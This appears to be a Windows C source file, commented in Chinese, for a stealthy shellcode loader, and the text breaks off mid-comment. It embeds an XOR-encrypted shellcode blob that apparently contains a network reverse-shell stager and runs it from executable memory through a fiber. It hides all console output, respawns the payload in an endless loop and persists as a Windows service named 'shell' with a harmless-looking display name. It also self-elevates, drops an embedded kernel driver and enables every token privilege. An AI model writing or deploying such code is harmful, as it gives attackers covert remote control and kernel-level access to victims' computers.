/**
 * @file main_dual_new.c
 * @brief 双模式启动架构 + 内核级权限获取 — 单文件自包含部署
 *
 * 编译: g++ main_dual_new.c main_dual_new.rc -o main_dual_new.exe
 *         -mwindows -ladvapi32 -lwtsapi32 -luserenv
 *
 * 编译产物 main_dual_new.exe 为独立可执行文件，无需任何外部依赖:
 *   - Sirius.sys 已嵌入为 RCDATA 资源，运行时自动释放
 *   - 释放在 exe 同目录或临时目录，加载后无需保留外部 .sys 文件
 *
 * -mwindows 确保进程启动时不创建控制台窗口（无闪窗），
 * 仅在 --console / --uninstall 时显式 AllocConsole()。
 *
 * ================================================================
 * 架构分层
 * ================================================================
 *
 *   ┌─────────────────────────────────────────┐
 *   │ Layer 3 — 统一入口 main()                │
 *   │   默认静默运行，--console 可开启日志输出   │
 *   ├──────────────┬──────────────────────────┤
 *   │ AppEntry()   │ ServiceEntry()           │   ← Layer 2 — 独立入口逻辑
 *   │ 应用程序模式  │ Windows 服务模式          │
 *   ├──────────────┴──────────────────────────┤
 *   │         RunBusinessCore(hStop)          │   ← Layer 1 — 共享业务核心
 *   │         Master/Slave 保活循环            │
 *   └─────────────────────────────────────────┘
 *
 * ================================================================
 * 启动方式选择
 * ================================================================
 *
 *   默认:          program.exe               静默运行（无窗口、无日志）
 *   控制台模式:    program.exe --console     有窗口、有日志（调试用）
 *   卸载服务:      program.exe --uninstall   有窗口、有日志（需管理员）
 *   Slave 子进程:  program.exe --slave       静默（内部使用）
 *
 * ================================================================
 * 服务生命周期
 * ================================================================
 *
 *   SCM → SvcMain() → START_PENDING → RUNNING (工作线程运行)
 *                                            │
 *                       ┌────────────────────┘
 *                       ↓
 *   SCM → SvcCtrlHandler(SERVICE_CONTROL_STOP) → STOP_PENDING
 *                       ↓
 *                   SetEvent(g_hStopEvent) → 工作线程退出
 *                       ↓
 *                   STOPPED (SCM 确认)
 *
 *   重启: 通过服务配置的失败恢复策略（失败后 60 秒自动重启服务）
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <shlobj.h>
#include <TlHelp32.h>     /* CreateToolhelp32Snapshot / 进程枚举 */
#include <sddl.h>         /* ConvertStringSecurityDescriptorToSecurityDescriptor */
#include <aclapi.h>       /* SetSecurityInfo / SetNamedSecurityInfo */
#include <wtsapi32.h>     /* WTSGetActiveConsoleSessionId */
#include <userenv.h>      /* CreateEnvironmentBlock */
#include "resource.h"     /* 嵌入资源 ID 定义 */
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")

/* ================================================================
 * 静默模式控制
 * ================================================================ */

/** @brief 静默运行标志：TRUE 时不显示控制台窗口、不输出日志 */
static BOOL g_bSilent = FALSE;

/**
 * @brief 进入静默模式（GUI 子系统默认状态）
 *
 * 无需 FreeConsole — 使用 -mwindows 编译时根本不创建控制台窗口。
 * 只需将 stdout/stderr 重定向到 NUL，确保任何 printf 输出被丢弃。
 */
static void EnterSilentMode(void) {
    g_bSilent = TRUE;
    freopen("NUL", "w", stdout);
    freopen("NUL", "w", stderr);
}

/**
 * @brief 分配控制台窗口（仅在 --console / --uninstall 时调用）
 *
 * 进程编译为 GUI 子系统，默认无控制台。
 * 此函数创建控制台并重定向 stdout/stderr 到 CONOUT$。
 */
static void AllocConsoleWindow(void) {
    g_bSilent = FALSE;
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
}

/* ================================================================
 * 服务配置常量
 * ================================================================ */

#define SERVICE_NAME         "shell"
#define SERVICE_DISPLAY_NAME "Hello Dual-Mode Service"

/* ================================================================
 * Layer 1 — 共享业务核心
 * ================================================================ */

/**
 * @brief 嵌入的加密二进制程序（XOR 0x12 加密）
 *
 * 业务核心的"数据层"：所有入口共享同一份加密载荷。
 */
static const unsigned char kPayload[509] = {
    0xEE, 0x5A, 0x91, 0xF6, 0xE2, 0xFA, 0xDE, 0x12, 0x12, 0x12, 0x53, 0x43, 0x53, 0x42, 0x40, 0x5A,
    0x23, 0xC0, 0x43, 0x77, 0x5A, 0x99, 0x40, 0x72, 0x5A, 0x99, 0x40, 0x0A, 0x5A, 0x99, 0x40, 0x32,
    0x44, 0x5A, 0x99, 0x60, 0x42, 0x5A, 0x1D, 0xA5, 0x58, 0x5A, 0x53, 0xAB, 0x28, 0xF7, 0x8A, 0xE5,
    0x5A, 0x23, 0xD2, 0xBE, 0x2E, 0x73, 0x6E, 0x10, 0x3E, 0x32, 0x53, 0xD3, 0xDB, 0x1F, 0x53, 0x13,
    0xD3, 0xF0, 0xFF, 0x40, 0x53, 0x43, 0x5A, 0x99, 0x40, 0x32, 0x99, 0x50, 0x2E, 0x5A, 0x13, 0xC2,
    0x74, 0x93, 0x6A, 0x0A, 0x19, 0x10, 0x1D, 0x97, 0x7D, 0x12, 0x12, 0x12, 0x99, 0x92, 0x9A, 0x12,
    0x12, 0x12, 0x5A, 0x97, 0xD2, 0x66, 0x76, 0x5A, 0x13, 0xC2, 0x99, 0x5A, 0x0A, 0x42, 0x56, 0x99,
    0x52, 0x32, 0x5B, 0x13, 0xC2, 0xF1, 0x41, 0x5A, 0xED, 0xDB, 0x53, 0x99, 0x26, 0x9A, 0x56, 0x99,
    0x5E, 0x36, 0x1A, 0x5A, 0x13, 0xC4, 0x5A, 0x23, 0xD2, 0x53, 0xD3, 0xDB, 0x1F, 0xBE, 0x53, 0x13,
    0xD3, 0x2A, 0xF2, 0x67, 0xE3, 0x57, 0x2B, 0xC3, 0x67, 0xC9, 0x4A, 0x56, 0x99, 0x52, 0x36, 0x5B,
    0x13, 0xC2, 0x74, 0x53, 0x99, 0x1E, 0x5A, 0x56, 0x99, 0x52, 0x0E, 0x5B, 0x13, 0xC2, 0x53, 0x99,
    0x16, 0x9A, 0x53, 0x4A, 0x5A, 0x13, 0xC2, 0x53, 0x4A, 0x4C, 0x4B, 0x48, 0x53, 0x4A, 0x53, 0x4B,
    0x53, 0x48, 0x5A, 0x91, 0xFE, 0x32, 0x53, 0x40, 0xED, 0xF2, 0x4A, 0x53, 0x4B, 0x48, 0x5A, 0x99,
    0x00, 0xFB, 0x59, 0xED, 0xED, 0xED, 0x4F, 0x5B, 0xAC, 0x65, 0x61, 0x20, 0x4D, 0x21, 0x20, 0x12,
    0x12, 0x53, 0x44, 0x5B, 0x9B, 0xF4, 0x5A, 0x93, 0xFE, 0xB2, 0x13, 0x12, 0x12, 0x5B, 0x9B, 0xF7,
    0x5B, 0xAE, 0x10, 0x12, 0x09, 0x14, 0xD2, 0xBA, 0x1A, 0xF7, 0x53, 0x46, 0x5B, 0x9B, 0xF6, 0x5E,
    0x9B, 0xE3, 0x53, 0xA8, 0x7C, 0xEA, 0xEA, 0x0F, 0xED, 0xC7, 0x5E, 0x9B, 0xF8, 0x7A, 0x13, 0x13,
    0x12, 0x12, 0x4B, 0x53, 0xA8, 0x79, 0x41, 0x11, 0x0A, 0xED, 0xC7, 0x78, 0x18, 0x53, 0x4C, 0x42,
    0x42, 0x5F, 0x23, 0xDB, 0x5F, 0x23, 0xD2, 0x5A, 0xED, 0xD2, 0x5A, 0x9B, 0xD0, 0x5A, 0xED, 0xD2,
    0x5A, 0x9B, 0xD3, 0x53, 0xA8, 0x39, 0xF1, 0x64, 0xEA, 0xED, 0xC7, 0x5A, 0x9B, 0xD5, 0x78, 0x02,
    0x53, 0x4A, 0x5E, 0x9B, 0xF0, 0x5A, 0x9B, 0xEB, 0x53, 0xA8, 0x3E, 0xD5, 0x0E, 0xB6, 0xED, 0xC7,
    0x97, 0xD2, 0x66, 0x18, 0x5B, 0xED, 0xDC, 0x67, 0xF7, 0xFA, 0x81, 0x12, 0x12, 0x12, 0x5A, 0x91,
    0xFE, 0x02, 0x5A, 0x9B, 0xF0, 0x5F, 0x23, 0xDB, 0x78, 0x16, 0x53, 0x4A, 0x5A, 0x9B, 0xEB, 0x53,
    0xA8, 0x39, 0x31, 0x8A, 0x38, 0xED, 0xC7, 0x91, 0xEA, 0x12, 0x6C, 0x47, 0x5A, 0x91, 0xD6, 0x32,
    0x4C, 0x9B, 0xE4, 0x78, 0x52, 0x53, 0x4B, 0x7A, 0x12, 0x02, 0x12, 0x12, 0x53, 0x4A, 0x5A, 0x9B,
    0xE0, 0x5A, 0x23, 0xDB, 0x53, 0xA8, 0x6B, 0x37, 0x34, 0xEE, 0xED, 0xC7, 0x5A, 0x9B, 0xD1, 0x5B,
    0x9B, 0xD5, 0x5F, 0x23, 0xDB, 0x5B, 0x9B, 0xE2, 0x5A, 0x9B, 0xC8, 0x5A, 0x9B, 0xEB, 0x53, 0xA8,
    0x39, 0x31, 0x8A, 0x38, 0xED, 0xC7, 0x91, 0xEA, 0x12, 0x6F, 0x3A, 0x4A, 0x53, 0x45, 0x4B, 0x7A,
    0x12, 0x52, 0x12, 0x12, 0x53, 0x4A, 0x78, 0x12, 0x48, 0x53, 0xA8, 0x73, 0x9F, 0x4D, 0xC2, 0xED,
    0xC7, 0x45, 0x4B, 0x53, 0xA8, 0x6D, 0x09, 0x4B, 0x79, 0xED, 0xC7, 0x5B, 0xED, 0xDC, 0xFB, 0x2E,
    0xED, 0xED, 0xED, 0x5A, 0x13, 0xD1, 0x5A, 0x3B, 0xD4, 0x5A, 0x97, 0xE4, 0x67, 0xA6, 0x53, 0xED,
    0xF5, 0x4A, 0x78, 0x12, 0x4B, 0x53, 0xA8, 0x54, 0x06, 0xE1, 0xE4, 0xED, 0xC7 
};

static const unsigned char kXorKey = 0x12; ///< XOR 解密密钥

/* ---- Slave 子进程 ---- */

/**
 * @brief Slave 模式：解密并执行 shellcode
 *
 * 由 Master 进程通过 CreateProcess("self --slave") 派生。
 * shellcode 调用 ExitProcess 时，整个 Slave 进程退出。
 */
static void SlaveRun(void) {
    unsigned char code[509];
    memcpy(code, kPayload, sizeof(kPayload));

    for (int i = 0; i < (int)sizeof(code); i++)
        code[i] ^= kXorKey;

    LPVOID alloc = VirtualAlloc(NULL, sizeof(code),
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (alloc == NULL) return;

    CopyMemory(alloc, code, sizeof(code));

    ConvertThreadToFiber(NULL);
    LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)alloc, NULL);
    SwitchToFiber(fiber);

    DeleteFiber(fiber);
    VirtualFree(alloc, 0, MEM_RELEASE);
}

/* ---- Master 保活循环（共享核心） ---- */

/**
 * @brief 共享业务核心：Master 保活循环
 *
 * 内部使用 GetModuleFileNameW + CreateProcessW 确保中文路径兼容。
 *
 * @param hStopEvent  停止事件句柄（NULL = 应用程序模式，不可中断）
 * @param pRestartCount 输出重启次数
 * @param pModeLabel  模式标签（用于日志）
 */
static void RunBusinessCore(HANDLE hStopEvent,
                            int   *pRestartCount,
                            LPCSTR pModeLabel) {
    /// 用 Unicode API 获取自身路径（支持中文文件名）
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    printf("========================================\n");
    printf("  Master — %s\n", pModeLabel);
    printf("  PID: %lu\n", GetCurrentProcessId());
    printf("========================================\n\n");

    while (1) {
        if (hStopEvent && WaitForSingleObject(hStopEvent, 0) == WAIT_OBJECT_0)
            break;

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        WCHAR cmdLine[MAX_PATH + 16];
        wsprintfW(cmdLine, L"\"%s\" --slave", selfPath);

        if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
                            0, NULL, NULL, &si, &pi)) {
            printf("[ERROR] CreateProcess 失败 (错误码: %lu)，立即重试...\n",
                   GetLastError());
            if (hStopEvent)
                WaitForSingleObject(hStopEvent, 0);
            else
                Sleep(0);
            continue;
        }

        (*pRestartCount)++;
        printf("[INFO] 启动嵌入程序 (第 %d 次运行, PID=%lu)...\n",
               *pRestartCount, pi.dwProcessId);

        /// 同时等待 Slave 退出和停止信号
        HANDLE handles[2] = { pi.hProcess };
        DWORD count = 1;
        if (hStopEvent) {
            handles[1] = hStopEvent;
            count = 2;
        }

        DWORD result = WaitForMultipleObjects(count, handles, FALSE, INFINITE);

        if (hStopEvent && result == WAIT_OBJECT_0 + 1) {
            /// 收到停止命令 → 终止 Slave 并退出循环
            printf("[INFO] 收到停止命令，终止 Slave (PID=%lu)...\n",
                   pi.dwProcessId);
            TerminateProcess(pi.hProcess, 0);
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            break;
        }

        /// Slave 正常退出
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        printf("[INFO] 嵌入程序已退出 (退出码: %lu)，立即重新启动...\n\n",
               exitCode);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        /// 不延迟：立即重新启动 Slave
        if (hStopEvent)
            WaitForSingleObject(hStopEvent, 0);
        else
            Sleep(0);
    }
}

/* ================================================================
 * Layer 2-A — 应用程序入口 (AppEntry)
 * ================================================================ */

/**
 * @brief 应用程序模式入口
 *
 * 以普通控制台程序运行，Ctrl+C 可终止。
 * 不注册 SCM，不使用停止事件 —— 纯 while(1) 无限保活。
 */
static void AppEntry(void) {
    int restartCount = 0;
    RunBusinessCore(NULL, &restartCount,
                    "应用程序模式 (Ctrl+C 退出)");
}

/* ================================================================
 * Layer 2-B — 服务入口 (ServiceEntry)
 * ================================================================ */

/// 服务全局状态
static SERVICE_STATUS        g_SvcStatus;
static SERVICE_STATUS_HANDLE g_SvcStatusHandle;
static HANDLE                g_hSvcStopEvent;

/**
 * @brief 向 SCM 汇报服务状态
 */
static void ReportStatus(DWORD state, DWORD exitCode, DWORD waitHint) {
    static DWORD checkpoint = 1;

    g_SvcStatus.dwCurrentState  = state;
    g_SvcStatus.dwWin32ExitCode = exitCode;
    g_SvcStatus.dwWaitHint      = waitHint;

    g_SvcStatus.dwControlsAccepted =
        (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;

    g_SvcStatus.dwCheckPoint =
        (state == SERVICE_RUNNING || state == SERVICE_STOPPED) ? 0 : checkpoint++;

    SetServiceStatus(g_SvcStatusHandle, &g_SvcStatus);
}

/**
 * @brief SCM 控制处理器
 *
 * 响应 SERVICE_CONTROL_STOP:
 *   1. 汇报 STOP_PENDING
 *   2. 设置停止事件 → 通知 RunBusinessCore 退出
 */
static VOID WINAPI SvcCtrlHandler(DWORD ctrl) {
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
        ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);
        SetEvent(g_hSvcStopEvent);
        return;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    ReportStatus(g_SvcStatus.dwCurrentState, NO_ERROR, 0);
}

/**
 * @brief 服务工作线程
 *
 * 在独立线程中运行业务核心，使其可以被 SCM 停止命令中断。
 */
static DWORD WINAPI SvcWorker(LPVOID param) {
    (void)param;

    int restartCount = 0;
    RunBusinessCore(g_hSvcStopEvent, &restartCount,
                    "服务模式 (由 SCM 管理)");
    return 0;
}

/**
 * @brief 服务主函数（SCM 调用）
 *
 * 服务生命周期:
 *   START_PENDING → RUNNING → (收到 STOP) → STOP_PENDING → STOPPED
 */
static VOID WINAPI SvcMain(DWORD argc, LPTSTR *argv) {
    (void)argc; (void)argv;

    /// 注册控制处理器
    g_SvcStatusHandle = RegisterServiceCtrlHandlerA(SERVICE_NAME, SvcCtrlHandler);
    if (!g_SvcStatusHandle) return;

    g_SvcStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_SvcStatus.dwServiceSpecificExitCode = 0;

    ReportStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    /// 创建停止事件
    g_hSvcStopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!g_hSvcStopEvent) {
        ReportStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    /// 设置工作目录为 exe 所在目录（Unicode 版，支持中文路径）
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    WCHAR *slash = wcsrchr(selfPath, L'\\');
    if (slash) { *slash = L'\0'; SetCurrentDirectoryW(selfPath); *slash = L'\\'; }

    ReportStatus(SERVICE_RUNNING, NO_ERROR, 0);

    /// 启动工作线程并等待
    HANDLE hWorker = CreateThread(NULL, 0, SvcWorker, NULL, 0, NULL);
    if (hWorker) {
        WaitForSingleObject(hWorker, INFINITE);
        CloseHandle(hWorker);
    }

    CloseHandle(g_hSvcStopEvent);
    ReportStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

static void UninstallService(void) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) {
        printf("[ERROR] 打开 SCM 失败 (%lu)，需管理员权限\n", GetLastError());
        return;
    }

    SC_HANDLE svc = OpenServiceW(scm, L"" SERVICE_NAME, SERVICE_STOP | DELETE);
    if (!svc) {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
            printf("[WARN] 服务 \"%s\" 不存在\n", SERVICE_NAME);
        else
            printf("[ERROR] 打开服务失败 (%lu)\n", GetLastError());
        CloseServiceHandle(scm);
        return;
    }

    SERVICE_STATUS status;
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    Sleep(1000);

    if (DeleteService(svc))
        printf("[OK] 服务 \"%s\" 卸载成功\n", SERVICE_NAME);
    else
        printf("[ERROR] 删除服务失败 (%lu)\n", GetLastError());

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

/* ================================================================
 * Layer 3 — 统一入口 main()
 * ================================================================ */

/**
 * @brief 统一入口
 *
 * 静默模式策略:
 *   - 默认以静默模式运行：FreeConsole + stdout/stderr → NUL
 *   - --console 显式开启控制台输出
 
 *
 * SCM 连接策略:
 *   先尝试 StartServiceCtrlDispatcherA →
 *     成功 → SCM 接管，SvcMain 运行服务生命周期
 *     失败 (ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) →
 *       不是由 SCM 启动 → AppEntry (应用程序模式)
 */
// ---------- 权限检测函数（无需修改，不涉及字符串） ----------
BOOL IsElevated() {
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            fIsElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return fIsElevated;
}

// ---------- 提权重启函数（显式 ANSI 版本） ----------
BOOL RunAsAdmin() {
    SHELLEXECUTEINFOA sei = { sizeof(sei) };   // 使用 A 版本结构体
    sei.lpVerb = "runas";                       // char* 类型
    sei.lpFile = _pgmptr;                       // _pgmptr 是 char*，完全匹配
    sei.nShow = SW_SHOWNORMAL;
    return ShellExecuteExA(&sei);               // 调用 A 版本函数
}

/**
 * @brief 等待指定服务停止
 * @param serviceName  服务名称（ANSI 字符串）
 * @param timeoutMs    超时时间（毫秒），设为 INFINITE 则无限等待
 * @return TRUE 表示服务已停止，FALSE 表示超时或失败
 */
BOOL WaitForServiceStop(LPCSTR serviceName, DWORD timeoutMs) {
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS status;
    BOOL bStopped = FALSE;
    DWORD startTime = GetTickCount();

    // 1. 打开服务控制管理器（只需查询权限）
    hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("OpenSCManager 失败，错误码: %lu\n", GetLastError());
        return FALSE;
    }

    // 2. 打开服务（只需查询状态权限）
    hService = OpenServiceA(hSCM, serviceName, SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            // 服务不存在，视为已停止（因为目标文件不可能被服务占用）
            printf("服务 \"%s\" 不存在，视为已停止。\n", serviceName);
            bStopped = TRUE;
            goto cleanup;
        }
        printf("OpenService 失败，错误码: %lu\n", err);
        goto cleanup;
    }

    // 3. 轮询状态
    while (1) {
        if (!QueryServiceStatus(hService, &status)) {
            printf("QueryServiceStatus 失败，错误码: %lu\n", GetLastError());
            break;
        }

        if (status.dwCurrentState == SERVICE_STOPPED) {
            printf("服务 \"%s\" 已停止。\n", serviceName);
            bStopped = TRUE;
            break;
        }

        // 检查超时（若 timeoutMs == INFINITE 则永不超时）
        if (timeoutMs != INFINITE) {
            DWORD elapsed = GetTickCount() - startTime;
            if (elapsed >= timeoutMs) {
                printf("等待服务 \"%s\" 停止超时（%lu ms），当前状态: %lu\n",
                       serviceName, timeoutMs, status.dwCurrentState);
                break;
            }
        }

        // 等待一小段时间再查询（避免忙等）
        Sleep(200);
    }

cleanup:
    if (hService) CloseServiceHandle(hService);
    if (hSCM) CloseServiceHandle(hSCM);
    return bStopped;
}

/* ================================================================
 * Layer 2.5 — 内核级权限获取模块
 *
 * 参考 StarlightGUI (Elevator.h / KernelInstance.cpp / DriverUtils.cpp) 实现。
 * 技术路线: 安全描述符覆盖 → 特权启用 → TrustedInstaller 提权 → 内核驱动加载
 * ================================================================ */

/* ---- 嵌入式驱动资源释放 ---- */

/**
 * @brief 从 exe 资源中释放嵌入的内核驱动到磁盘
 *
 * Sirius.sys 以 RCDATA 类型嵌入到 exe 中，运行时按需写到磁盘。
 * 优先写入 exe 所在目录（无需管理员），失败则尝试临时目录。
 *
 * @param outPath  [out] 释放后的完整驱动路径（调用者提供 MAX_PATH 大小的缓冲区）
 * @return TRUE 成功，FALSE 失败
 */
static BOOL ExtractEmbeddedDriver(WCHAR outPath[MAX_PATH]) {
    /* 从当前 exe 的资源段加载嵌入的 Sirius.sys */
    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_SIRIUS_DRIVER),
                               RT_RCDATA);
    if (!hRes) {
        printf("[Extract] FindResource 失败 (错误: %lu)\n", GetLastError());
        return FALSE;
    }

    HGLOBAL hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) {
        printf("[Extract] LoadResource 失败 (错误: %lu)\n", GetLastError());
        return FALSE;
    }

    DWORD dwSize = SizeofResource(NULL, hRes);
    LPVOID pData = LockResource(hGlobal);
    if (!pData || dwSize == 0) {
        printf("[Extract] LockResource 失败或资源大小为 0\n");
        return FALSE;
    }
    printf("[Extract] 嵌入驱动大小: %lu bytes\n", dwSize);

    /* 构造目标路径: <exe目录>\Sirius.sys */
    WCHAR exeDir[MAX_PATH];
    GetModuleFileNameW(NULL, exeDir, MAX_PATH);
    WCHAR *slash = wcsrchr(exeDir, L'\\');
    if (slash) *slash = L'\0';
    wsprintfW(outPath, L"%s\\Sirius.sys", exeDir);

    /* 写入文件 */
    HANDLE hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        /* 降级: 尝试临时目录 */
        WCHAR tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        wsprintfW(outPath, L"%sSirius.sys", tempPath);
        printf("[Extract] exe目录写入失败，尝试临时目录: %ls\n", outPath);
        hFile = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[Extract] 无法创建驱动文件 (错误: %lu)\n", GetLastError());
        return FALSE;
    }

    DWORD bytesWritten = 0;
    BOOL ok = WriteFile(hFile, pData, dwSize, &bytesWritten, NULL);
    CloseHandle(hFile);

    if (!ok || bytesWritten != dwSize) {
        printf("[Extract] 写入驱动文件失败 (写入 %lu/%lu bytes)\n",
               bytesWritten, dwSize);
        return FALSE;
    }

    printf("[Extract] 驱动已释放到: %ls\n", outPath);
    return TRUE;
}

/* ---- 查找进程ID ---- */

/**
 * @brief 通过进程名查找 PID
 *
 * 参考 StarlightGUI Elevator.h:FindProcessId()
 * 使用 CreateToolhelp32Snapshot 遍历进程快照
 *
 * @param processName  进程名（如 "winlogon.exe"）
 * @return 进程ID，未找到返回 0
 */
static DWORD FindProcessId(LPCWSTR processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("  [DEBUG] CreateToolhelp32Snapshot 失败 (错误: %lu)\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe = { sizeof(pe) };
    int scanned = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            scanned++;
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                printf("  [DEBUG] 在 %d 个进程中找到 %ls (PID=%lu)\n",
                       scanned, processName, pid);
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    if (pid == 0) {
        printf("  [DEBUG] 扫描 %d 个进程，未找到 %ls\n", scanned, processName);
    }
    CloseHandle(hSnapshot);
    return pid;
}

/* ---- 单个特权启用 ---- */

/**
 * @brief 启用当前进程指定特权
 *
 * @param privilegeName  特权名（ANSI），如 "SeDebugPrivilege", "SeTcbPrivilege"
 * @return TRUE 成功，FALSE 失败
 */
static BOOL EnablePrivilege(LPCSTR privilegeName) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("  [DEBUG] EnablePrivilege(%s): OpenProcessToken 失败 (错误: %lu)\n",
               privilegeName, GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
        printf("  [DEBUG] EnablePrivilege(%s): LookupPrivilegeValue 失败 (错误: %lu)\n",
               privilegeName, GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    BOOL result = (err == ERROR_SUCCESS);
    if (!result) {
        printf("  [DEBUG] EnablePrivilege(%s): AdjustTokenPrivileges 失败 "
               "(错误: %lu, 特权可能未分配到当前 Token)\n", privilegeName, err);
    }
    CloseHandle(hToken);
    return result;
}

/* ---- 全部特权遍历启用 ---- */

/**
 * @brief 启用当前进程 Token 中的全部可用特权
 *
 * 参考 StarlightGUI Elevator.h:EnableAllPrivileges()
 * 遍历 Token 中所有特权项，逐一设 SE_PRIVILEGE_ENABLED 属性。
 *
 * @param hToken  进程或线程 Token 句柄（需 TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY）
 * @return TRUE 成功，FALSE 失败
 */
static BOOL EnableAllPrivileges(HANDLE hToken) {
    DWORD dwSize = 0;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    BOOL result = FALSE;
    DWORD err = 0;

    /* 第一阶段：查询所需缓冲区大小 */
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("  [DEBUG] EnableAllPrivileges: GetTokenInformation(size) 失败"
               " (错误: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("  [DEBUG] Token 特权信息缓冲区大小: %lu 字节\n", dwSize);

    pTokenPrivileges = (PTOKEN_PRIVILEGES)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pTokenPrivileges) {
        printf("  [DEBUG] EnableAllPrivileges: HeapAlloc 失败\n");
        return FALSE;
    }

    /* 第二阶段：获取完整的特权列表 */
    if (!GetTokenInformation(hToken, TokenPrivileges,
                             pTokenPrivileges, dwSize, &dwSize)) {
        printf("  [DEBUG] EnableAllPrivileges: GetTokenInformation(data) 失败"
               " (错误: %lu)\n", GetLastError());
        goto cleanup;
    }
    printf("  [DEBUG] Token 中共有 %lu 项特权\n",
           pTokenPrivileges->PrivilegeCount);

    /* 第三阶段：遍历并启用每一个特权 */
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
        pTokenPrivileges->Privileges[i].Attributes |= SE_PRIVILEGE_ENABLED;
    }

    /* 第四阶段：一次性提交全部特权变更 */
    if (!AdjustTokenPrivileges(hToken, FALSE, pTokenPrivileges,
                               dwSize, NULL, NULL)) {
        printf("  [DEBUG] EnableAllPrivileges: AdjustTokenPrivileges 失败"
               " (错误: %lu)\n", GetLastError());
        goto cleanup;
    }

    err = GetLastError();
    result = (err == ERROR_SUCCESS);
    if (!result) {
        printf("  [DEBUG] EnableAllPrivileges: 部分特权启用失败 (错误: %lu)\n",
               err);
    }

cleanup:
    HeapFree(GetProcessHeap(), 0, pTokenPrivileges);
    return result;
}

/* ---- 关键内核特权批量启用 ---- */

/**
 * @brief 启用所有对内核操作至关重要的特权
 *
 * 参考 StarlightGUI 的需求，涵盖以下场景:
 *   SeTcbPrivilege          — 充当操作系统的一部分（TrustedInstaller 提权前提）
 *   SeDebugPrivilege        — 调试/打开任意进程
 *   SeLoadDriverPrivilege   — 加载/卸载内核驱动
 *   SeBackupPrivilege       — 绕过文件读权限检查
 *   SeRestorePrivilege      — 绕过文件写权限检查
 *   SeImpersonatePrivilege  — 模拟客户端用户
 *   SeCreateTokenPrivilege  — 创建 Token 对象
 *   SeTakeOwnershipPrivilege — 取得所有权
 *   SeSecurityPrivilege     — 管理审计和安全日志
 *   SeIncreaseQuotaPrivilege — 增加进程配额
 *   SeAssignPrimaryTokenPrivilege — 替换进程级 Token
